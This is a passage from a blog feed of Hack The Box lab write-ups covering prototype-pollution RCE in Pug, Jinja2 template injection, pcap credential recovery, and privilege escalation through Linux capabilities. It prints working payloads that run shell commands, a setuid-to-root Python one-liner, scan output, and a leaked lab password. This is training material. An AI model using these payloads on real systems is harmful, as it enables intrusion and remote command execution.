<hr>
<ul>
<li>Location of vulnerability (<code>routes/index.js</code>)</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js">	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">pug</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#39;pug&#39;</span>);

	...
	<span style="color:#a6e22e">router</span>.<span style="color:#a6e22e">post</span>(<span style="color:#e6db74">&#39;/api/submit&#39;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
	    <span style="color:#66d9ef">const</span> { <span style="color:#a6e22e">artist</span> } <span style="color:#f92672">=</span> <span style="color:#a6e22e">unflatten</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">body</span>);
	
		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Haigh&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Westaway&#39;</span>) <span style="color:#f92672">||</span> <span style="color:#a6e22e">artist</span>.<span style="color:#a6e22e">name</span>.<span style="color:#a6e22e">includes</span>(<span style="color:#e6db74">&#39;Gingell&#39;</span>)) {
			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
				<span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">pug</span>.<span style="color:#a6e22e">compile</span>(<span style="color:#e6db74">&#39;span Hello #{user}, thank you for letting us know!&#39;</span>)({ <span style="color:#a6e22e">user</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;guest&#39;</span> })
			});
		} <span style="color:#66d9ef">else</span> {
			<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">json</span>({
				<span style="color:#e6db74">&#39;response&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;Please provide us with the full name of an existing member.&#39;</span>
			});
		}
	});
</code></pre></div><ul>
<li>Request submitted through <code>/api/submit</code> where body of the request(<code>req.body</code>) is passed to <code>unflatten</code>.</li>
<li>So we can pass our payload through the body and when it is unflattened, we can prolly get RCE.</li>
</ul>
<h3 id="exploiting-the-bug">Exploiting the bug</h3>
<ul>
<li>We navigate to <code>/</code> (http://159.65.31.1:32618/) and then enter some random values, intercept the request in Burp.</li>
<li>Modify the request of the body so it looks like:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-HTTP" data-lang="HTTP"><span style="color:#a6e22e">POST</span> /api/submit <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">159.65.31.1:32618</span>
Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">170</span>
User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36</span>
Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/json</span>
Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">*/*</span>
Sec-GPC<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://159.65.31.1:32309</span>
Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://159.65.31.1:32309/</span>
Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate</span>
Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-GB,en-US;q=0.9,en;q=0.8</span>
Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>

{
	<span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
	<span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
	<span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(ls | grep flag)&#39;)&#34;</span>
	}
}
</code></pre></div><ul>
<li>Output:</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(ls | grep flag)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: flagQLGyS: not found&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
</code></pre></div><p><em>Note: We are running <code>$(ls |  grep flag)</code> instead of <code>ls | grep flag</code> because when the command executes without any error, we cannot see the output</em></p>
<ul>
<li>Now let&rsquo;s <code>cat</code> the file
<ul>
<li>Reques bodyt:</li>
</ul>
</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">		{
			<span style="color:#f92672">&#34;artist.name&#34;</span>:<span style="color:#e6db74">&#34;Haigh&#34;</span>,<span style="color:#f92672">&#34;__proto__.block&#34;</span>: {
	        <span style="color:#f92672">&#34;type&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>, 
	        <span style="color:#f92672">&#34;line&#34;</span>: <span style="color:#e6db74">&#34;process.mainModule.require(&#39;child_process&#39;).execSync(&#39;$(cat flagQLGyS)&#39;)&#34;</span>
		    }
		}
</code></pre></div><pre><code>- Output:
</code></pre>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">	&lt;<span style="color:#f92672">pre</span>&gt;Error: Command failed: $(cat flagQLGyS)&lt;<span style="color:#f92672">br</span>&gt;/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found
	&lt;<span style="color:#f92672">br</span>&gt; on line 1&lt;<span style="color:#f92672">br</span>&gt;
</code></pre></div><p>References:</p>
<ul>
<li>(Peak resource) <a href="https://blog.p6.is/AST-Injection/">https://blog.p6.is/AST-Injection/</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>HTB Templated - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-challenge-templated/</link>
            <pubDate>Sun, 26 Dec 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-challenge-templated/</guid>
            <description>Navigating through the website Requested: GET /invalid -&amp;gt; we got invalid
Verifying if SSTI is possible Requested: GET /invalid{{7*7}} -&amp;gt; we got invalid49 instead of invalid{{7*7}}
We know that it is Jinja2 and Flask, so we can use their payload.
Getting the flag Requested: GET /{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;cat%20flag.txt&#39;).read()}} -&amp;gt; we got the flag
Alternative Finding subprocess.Popen index.
 GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[100:] -&amp;gt; Popen is there in the list  GET /{{&#39;&#39;.__class__.mro()[1].__subclasses__()[300:] -&amp;gt; Popen is there in the list GET /{{&#39;&#39;.</description>
            <content type="html"><![CDATA[<h2 id="navigating-through-the-website">Navigating through the website</h2>
<p>Requested: <code>GET /invalid</code> -&gt; we got <code>invalid</code></p>
<p><img src="/img/templated/Pasted%20image%2020211226121920.png" alt=""></p>
<h2 id="verifying-if-ssti-is-possible">Verifying if SSTI is possible</h2>
<p>Requested: <code>GET /invalid{{7*7}}</code> -&gt; we got <code>invalid49</code> instead of <code>invalid{{7*7}}</code></p>
<p><img src="/img/templated/Pasted%20image%2020211226121844.png" alt=""></p>
<p>We know that it is Jinja2 and Flask, so we can use their payload.</p>
<h2 id="getting-the-flag">Getting the flag</h2>
<p>Requested: <code>GET /{{config.__class__.__init__.__globals__['os'].popen('cat%20flag.txt').read()}}</code> -&gt; we got the flag</p>
<p><img src="/img/templated/Pasted%20image%2020211226182358.png" alt=""></p>
<h3 id="alternative">Alternative</h3>
<p><strong>Finding <code>subprocess.Popen</code> index.</strong></p>
<ol>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[100:]</code> -&gt; Popen is there in the list
<img src="/img/templated/Pasted%20image%2020211226184612.png" alt=""></li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[300:]</code> -&gt; Popen is there in the list</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[500:]</code> -&gt; Internal Server Error</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[400:]</code> -&gt; Popen is there in the list</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[450:]</code> -&gt; Popen is NOT there in the list</li>
<li><code>GET /{{''.__class__.mro()[1].__subclasses__()[414]</code> -&gt; Popen exists</li>
</ol>
<p><code>GET /{{''.__class__.mro()[1].__subclasses__()[414]('cat%20flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}</code></p>
<p>References:</p>
<ul>
<li><a href="https://blog.nvisium.com/p263">https://blog.nvisium.com/p263</a></li>
<li><a href="https://blog.nvisium.com/p255">https://blog.nvisium.com/p255</a></li>
<li><a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection</a></li>
</ul>
]]></content>
        </item>
        
        <item>
            <title>HTB Cap - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-cap/</link>
            <pubDate>Fri, 23 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-cap/</guid>
            <description>Enumeration Nmap Scans Service Scan # Nmap 7.91 scan initiated Fri Jul 16 20:44:02 2021 as: nmap -T4 -A -p21,22,80 -oA nmap/service-scan -Pn 10.10.10.245 Nmap scan report for 10.10.10.245 Host is up (0.068s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: |_ 256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519) 80/tcp open http gunicorn | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 404 NOT FOUND | Server: gunicorn | Date: Fri, 16 Jul 2021 15:14:15 GMT | Connection: close | Content-Type: text/html; charset=utf-8 | Content-Length: 232 | &amp;lt;!</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<h2 id="nmap-scans">Nmap Scans</h2>
<h3 id="service-scan">Service Scan</h3>
<pre><code># Nmap 7.91 scan initiated Fri Jul 16 20:44:02 2021 as: nmap -T4 -A -p21,22,80 -oA nmap/service-scan -Pn 10.10.10.245
Nmap scan report for 10.10.10.245
Host is up (0.068s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:15 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 3.2 Final//EN&quot;&gt;
|     &lt;title&gt;404 Not Found&lt;/title&gt;
|     &lt;h1&gt;Not Found&lt;/h1&gt;
|     &lt;p&gt;The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.&lt;/p&gt;
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:09 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     &lt;!DOCTYPE html&gt;
|     &lt;html class=&quot;no-js&quot; lang=&quot;en&quot;&gt;
|     &lt;head&gt;
|     &lt;meta charset=&quot;utf-8&quot;&gt;
|     &lt;meta http-equiv=&quot;x-ua-compatible&quot; content=&quot;ie=edge&quot;&gt;
|     &lt;title&gt;Security Dashboard&lt;/title&gt;
|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
|     &lt;link rel=&quot;shortcut icon&quot; type=&quot;image/png&quot; href=&quot;/static/images/icon/favicon.ico&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/bootstrap.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/font-awesome.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/themify-icons.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/metisMenu.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/owl.carousel.min.css&quot;&gt;
|     &lt;link rel=&quot;stylesheet&quot; href=&quot;/static/css/slicknav.min.css&quot;&gt;
|     &lt;!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Fri, 16 Jul 2021 15:14:09 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     &lt;html&gt;
|     &lt;head&gt;
|     &lt;title&gt;Bad Request&lt;/title&gt;
|     &lt;/head&gt;
|     &lt;body&gt;
|     &lt;h1&gt;&lt;p&gt;Bad Request&lt;/p&gt;&lt;/h1&gt;
|     Invalid HTTP Version &amp;#x27;Invalid HTTP Version: &amp;#x27;RTSP/1.0&amp;#x27;&amp;#x27;
|     &lt;/body&gt;
|_    &lt;/html&gt;
|_http-server-header: gunicorn
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.91%I=7%D=7/16%Time=60F1A242%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,2FE5,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20
SF:Fri,\x2016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\
SF:nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20193
SF:86\r\n\r\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20class=\&quot;no-js\&quot;\x20lang=\&quot;en\&quot;&gt;\
SF:n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\x20\x20\x20\x2
SF:0&lt;meta\x20http-equiv=\&quot;x-ua-compatible\&quot;\x20content=\&quot;ie=edge\&quot;&gt;\n\x20\
SF:x20\x20\x20&lt;title&gt;Security\x20Dashboard&lt;/title&gt;\n\x20\x20\x20\x20&lt;meta\
SF:x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-scale=
SF:1\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;shortcut\x20icon\&quot;\x20type=\&quot;image
SF:/png\&quot;\x20href=\&quot;/static/images/icon/favicon\.ico\&quot;&gt;\n\x20\x20\x20\x20&lt;
SF:link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/bootstrap\.min\.css\&quot;&gt;
SF:\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/fon
SF:t-awesome\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20
SF:href=\&quot;/static/css/themify-icons\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=
SF:\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/metisMenu\.css\&quot;&gt;\n\x20\x20\x20\x2
SF:0&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/css/owl\.carousel\.min\.
SF:css\&quot;&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;/static/c
SF:ss/slicknav\.min\.css\&quot;&gt;\n\x20\x20\x20\x20&lt;!--\x20amchar&quot;)%r(HTTPOption
SF:s,B3,&quot;HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Fri,\x2
SF:016\x20Jul\x202021\x2015:14:09\x20GMT\r\nConnection:\x20close\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x
SF:20GET\r\nContent-Length:\x200\r\n\r\n&quot;)%r(RTSPRequest,121,&quot;HTTP/1\.1\x2
SF:0400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20text
SF:/html\r\nContent-Length:\x20196\r\n\r\n&lt;html&gt;\n\x20\x20&lt;head&gt;\n\x20\x20
SF:\x20\x20&lt;title&gt;Bad\x20Request&lt;/title&gt;\n\x20\x20&lt;/head&gt;\n\x20\x20&lt;body&gt;\
SF:n\x20\x20\x20\x20&lt;h1&gt;&lt;p&gt;Bad\x20Request&lt;/p&gt;&lt;/h1&gt;\n\x20\x20\x20\x20Invali
SF:d\x20HTTP\x20Version\x20&amp;#x27;Invalid\x20HTTP\x20Version:\x20&amp;#x27;RTSP
SF:/1\.0&amp;#x27;&amp;#x27;\n\x20\x20&lt;/body&gt;\n&lt;/html&gt;\n&quot;)%r(FourOhFourRequest,189
SF:,&quot;HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x20F
SF:ri,\x2016\x20Jul\x202021\x2015:14:15\x20GMT\r\nConnection:\x20close\r\n
SF:Content-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20232\
SF:r\n\r\n&lt;!DOCTYPE\x20HTML\x20PUBLIC\x20\&quot;-//W3C//DTD\x20HTML\x203\.2\x20
SF:Final//EN\&quot;&gt;\n&lt;title&gt;404\x20Not\x20Found&lt;/title&gt;\n&lt;h1&gt;Not\x20Found&lt;/h1&gt;
SF:\n&lt;p&gt;The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20ser
SF:ver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20ch
SF:eck\x20your\x20spelling\x20and\x20try\x20again\.&lt;/p&gt;\n&quot;);
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 16 20:47:13 2021 -- 1 IP address (1 host up) scanned in 190.95 seconds
</code></pre><ul>
<li>Port 21, 80 open</li>
</ul>
<h2 id="enumeration-port-80">Enumeration: Port 80</h2>
<ul>
<li>gunicorn</li>
</ul>
<h3 id="ip"><code>/ip</code></h3>
<p>Runs <code>ifconfig</code> on the machine</p>
<p><img src="/img/cap/Pasted_image_20210716205953.png" alt="/img/cap/Pasted_image_20210716205953.png"></p>
<h3 id="netstat"><code>/netstat</code></h3>
<p>Runs <code>netstat</code> on the machine</p>
<h3 id="capture"><code>/capture</code></h3>
<p>Captures PCAP packets of the server and made available for download</p>
<h3 id="ffuf-scan">ffuf scan</h3>
<pre><code>$ ffuf -u &lt;http://10.10.10.245/FUZZ&gt; -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -r -v -c -ic -of html -o http/http-80-medium-no-ext.html

         /'___\\  /'___\\           /'___\\
        /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/
       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\
        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/
         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\
          \\/_/    \\/_/   \\/___/    \\/_/

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : &lt;http://10.10.10.245/FUZZ&gt;
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
 :: Output file      : http/http-80-medium-no-ext.html
 :: File format      : html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/&gt;
    * FUZZ:

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/data&gt;
    * FUZZ: data

[Status: 200, Size: 17445, Words: 7275, Lines: 355]
| URL | &lt;http://10.10.10.245/ip&gt;
    * FUZZ: ip

[Status: 200, Size: 72923, Words: 36727, Lines: 768]
| URL | &lt;http://10.10.10.245/netstat&gt;
    * FUZZ: netstat

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/capture&gt;
    * FUZZ: capture

[Status: 200, Size: 19385, Words: 8716, Lines: 389]
| URL | &lt;http://10.10.10.245/&gt;
    * FUZZ:

:: Progress: [207630/207630] :: Job [1/1] :: 633 req/sec :: Duration: [0:05:37] :: Errors: 0 ::

</code></pre><pre><code>/
/data
/ip
/capture
/netstat

</code></pre><ul>
<li>
<p>The packets captured on <code>/capture</code> are available as <code>/data/1</code> and so forth. The number starts from 1.</p>
</li>
<li>
<p>Opening <code>/data/0</code> being packet not captured by us. Might find something juicy.</p>
</li>
<li>
<p>Downloading it and opening in wireshark</p>
<p><img src="/img/cap/Pasted_image_20210717190239.png" alt="/img/cap/Pasted_image_20210717190239.png"></p>
<p><img src="/img/cap/Pasted_image_20210717190340.png" alt="/img/cap/Pasted_image_20210717190340.png"></p>
</li>
</ul>
<p>We get FTP id and password</p>
<pre><code>nathan:Buck3tH4TF0RM3!
</code></pre><h1 id="exploitation">Exploitation</h1>
<h2 id="getting-shell">Getting shell</h2>
<p>Using these credentials to login in using SSH, we get a shell</p>
<p><img src="/img/cap/Pasted_image_20210717190453.png" alt="/img/cap/Pasted_image_20210717190453.png"></p>
<h1 id="post-exploit-enumeration---user-level">Post Exploit Enumeration - User level</h1>
<p><img src="/img/cap/Pasted_image_20210721202213.png" alt="/img/cap/Pasted_image_20210721202213.png"></p>
<p>Linux Capabilities: <em>Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.</em></p>
<p>Further Reading → <a href="https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities">https://book.hacktricks.xyz/linux-unix/privilege-escalation/linux-capabilities</a></p>
<h1 id="exploitation-1">Exploitation</h1>
<pre><code>python3.8 -c 'import os; os.setuid(0); os.system(&quot;/bin/bash&quot;);'
</code></pre><p><img src="/img/cap/Pasted_image_20210722000148.png" alt="/img/cap/Pasted_image_20210722000148.png"></p>
<p><img src="/img/cap/Pasted_image_20210722000201.png" alt="/img/cap/Pasted_image_20210722000201.png"></p>
]]></content>
        </item>
        
        <item>
            <title>HTB Spectra - Writeup</title>
            <link>https://harshitm98.github.io/posts/htb-machine-spectra/</link>
            <pubDate>Sun, 18 Jul 2021 00:00:00 +0000</pubDate>
            
            <guid>https://harshitm98.github.io/posts/htb-machine-spectra/</guid>
            <description>Enumeration Nmap Scans Service Scan # Nmap 7.91 scan initiated Fri Jun 11 23:59:16 2021 as: nmap -T4 -A -p22,80,3306 -oA nmap/service-scan -Pn 10.10.10.229 Nmap scan report for 10.10.10.229 Host is up (0.068s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.1 (protocol 2.0) | ssh-hostkey: |_ 4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA) 80/tcp open http nginx 1.17.4 |_http-server-header: nginx/1.17.4 |_http-title: Site doesn&#39;t have a title (text/html). 3306/tcp open mysql? |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) Service detection performed.</description>
            <content type="html"><![CDATA[<h1 id="enumeration">Enumeration</h1>
<h2 id="nmap-scans">Nmap Scans</h2>
<h3 id="service-scan">Service Scan</h3>
<pre><code># Nmap 7.91 scan initiated Fri Jun 11 23:59:16 2021 as: nmap -T4 -A -p22,80,3306 -oA nmap/service-scan -Pn 10.10.10.229
Nmap scan report for 10.10.10.229
Host is up (0.068s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey:
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql?
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)

Service detection performed. Please report any incorrect results at &lt;https://nmap.org/submit/&gt; .
# Nmap done at Sat Jun 12 00:01:05 2021 -- 1 IP address (1 host up) scanned in 109.31 seconds

</code></pre><p><strong>Summary</strong></p>
<ul>
<li>Ports opened -&gt; 22, 80, 3306</li>
</ul>
<h2 id="enumeration-port-80">Enumeration: Port 80</h2>
<p>Landing page:</p>
<p><img src="/img/spectra/Pasted_image_20210612000503.png" alt="/img/spectra/Pasted_image_20210612000503.png"></p>
<p>Source code:</p>
<p><img src="/img/spectra/Pasted_image_20210612000522.png" alt="/img/spectra/Pasted_image_20210612000522.png"></p>
<p>This uses <code>http://spectra.htb/</code> instead of the IP, so we modify in our <code>/etc/hosts</code> file as well</p>
<pre><code>$ cat /etc/hosts | grep spectra.htb
10.10.10.229    spectra.htb
</code></pre><h3 id="main">/main</h3>
<p>Landing page</p>
<p><img src="/img/spectra/Pasted_image_20210612000654.png" alt="/img/spectra/Pasted_image_20210612000654.png"></p>
<p>It&rsquo;s a wordpress site.</p>
<ul>
<li>wpscan does not reveal anything interesting.</li>
</ul>
<h3 id="testing">/testing</h3>
<ul>
<li>Error establishing database connection</li>
</ul>
<p>Running ffuf</p>
<pre><code>$ ffuf -u &lt;http://spectra.htb/testing/FUZZ&gt; -w /usr/share/wordlists/dirb/common.txt -r -v -c -ic -e .php,.txt -of html -o http/http-80-common-testing.html

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : &lt;http://spectra.htb/testing/FUZZ&gt;
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php .txt
 :: Output file      : http/http-80-common-testing.html
 :: File format      : html
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

[Status: 200, Size: 2514, Words: 1130, Lines: 27]
| URL | &lt;http://spectra.htb/testing/&gt;
    * FUZZ:

[Status: 200, Size: 19915, Words: 3331, Lines: 385]
| URL | &lt;http://spectra.htb/testing/license.txt&gt;
    * FUZZ: license.txt

[Status: 200, Size: 11460, Words: 5252, Lines: 102]
| URL | &lt;http://spectra.htb/testing/wp-admin&gt;
    * FUZZ: wp-admin

[Status: 200, Size: 627, Words: 259, Lines: 11]
| URL | &lt;http://spectra.htb/testing/wp-content&gt;
    * FUZZ: wp-content

[Status: 200, Size: 585, Words: 50, Lines: 7]
| URL | &lt;http://spectra.htb/testing/wp-settings.php&gt;
    * FUZZ: wp-settings.php

[Status: 200, Size: 25891, Words: 10424, Lines: 215]
| URL | &lt;http://spectra.htb/testing/wp-includes&gt;
    * FUZZ: wp-includes

[Status: 200, Size: 0, Words: 1, Lines: 1]
| URL | &lt;http://spectra.htb/testing/xmlrpc.php&gt;
    * FUZZ: xmlrpc.php

[Status: 200, Size: 0, Words: 1, Lines: 1]
| URL | &lt;http://spectra.htb/testing/xmlrpc.php&gt;
    * FUZZ: xmlrpc.php

:: Progress: [13842/13842] :: Job [1/1] :: 187 req/sec :: Duration: [0:01:45] :: Errors: 0 ::

</code></pre><ul>
<li>
<p>Going to <code>/testing/wp-admin</code> displays all the files in that directory. Perhaps, directory listing is turned on.</p>
<p><img src="/img/spectra/Pasted_image_20210617193018.png" alt="/img/spectra/Pasted_image_20210617193018.png"></p>
</li>
<li>
<p>Instead of going to <code>/testing/index.php</code> -&gt; <code>/testing/</code> gives us all the files there.</p>
<p><img src="/img/spectra/Pasted_image_20210617193216.png" alt="/img/spectra/Pasted_image_20210617193216.png"></p>
</li>
</ul>
<p>==Should try <em>.php.save</em> during directory brute forcing as well==</p>
<p>Seeing the source code of <code>wp-config.php.save</code> gives DB credentials</p>
<p><img src="/img/spectra/Pasted_image_20210617193453.png" alt="/img/spectra/Pasted_image_20210617193453.png"></p>
<pre><code>define( 'DB_NAME', 'dev' );
/** MySQL database username */
define( 'DB_USER', 'devtest' );
/** MySQL database password */
